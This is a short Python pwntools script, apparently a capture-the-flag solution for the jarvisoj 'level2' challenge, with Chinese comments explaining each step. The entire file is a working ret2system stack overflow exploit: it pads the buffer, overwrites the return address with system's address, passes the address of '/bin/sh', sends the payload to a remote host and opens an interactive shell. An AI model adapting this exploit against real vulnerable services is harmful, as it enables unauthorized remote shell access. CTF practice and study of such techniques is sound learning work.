#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

io = remote("pwn2.jarvisoj.com",9878)
elf = ELF("./level2")

sys_addr = elf.symbols["system"]                     # IDA对应的函数为 _system 0x08048320
bin_addr = elf.search("/bin/sh".encode()).__next__() # IDA可见 0x804a024

payload = 'a'*(0x88 + 0x4)                 #辣鸡填充值
payload += p32(sys_addr).decode('latin')   #覆盖返回地址到system函数
payload += p32(0xdeadbeef).decode('latin') #随意填写system函数调用结束的返回地址 0x1也行
payload += p32(bin_addr).decode('latin')   #system函数的参数，指向“/bin/sh”，实现调用

io.recvline()
io.sendline(payload)
io.interactive()
io.close()
